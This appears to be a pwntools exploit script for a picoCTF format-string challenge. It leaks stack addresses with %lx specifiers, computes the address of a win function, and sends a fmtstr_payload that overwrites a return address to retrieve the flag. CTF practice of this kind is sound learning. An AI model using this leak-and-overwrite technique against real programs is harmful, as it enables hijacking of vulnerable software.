from pwn import context, tube, remote, sleep
from pwn import info, error
from pwn import fmtstr_payload
from syoch_ctf import url_process

URL = "https://challenge-files.picoctf.net/c_shape_facility/3540df5468ae2357d00a7a3e2d396e6522b24f7a363cbaff8badcb270d186bda/valley"

context.clear(arch="amd64")
p = url_process(URL)
# p: tube = remote("shape-facility.picoctf.net", 57439)

p.recvuntil(b"Welcome to the Echo Valley, Try Shouting: ")

p.sendline(b"%27$8lx")
p.recvuntil(b"You heard in the distance: ")
main = int(p.recvline().strip().decode(), 16)
info(f"main: {hex(main)}")

win = main + (0x1269 - 0x1401)
info(f"win : {hex(win)}")

p.sendline(b"%28$8lx")
p.recvuntil(b"You heard in the distance: ")
rsp = int(p.recvline().strip().decode(), 16) - 0x1A8
info(f"rsp : {hex(rsp)}")

# * Doing FSA
info(f"rsp + 120: {hex(rsp + 120)}")
payload = fmtstr_payload(
    6,
    {
        rsp - 8: (win >> 0) & 0xFFFF,
    },
).replace(b"$lln", b"$hhn")
info(f"Payload length: {len(payload)}")
info(f"payload: {payload}")
if len(payload) > 100:
    error("Payload is too long")
    p.kill()
info(f"Payload length: {len(payload)}")

info("Doing FSA")
p.sendline(payload)

p.recvuntil(b"your flag: ")
sleep(0.5)

s = p.recvline().strip().decode()
info(s)
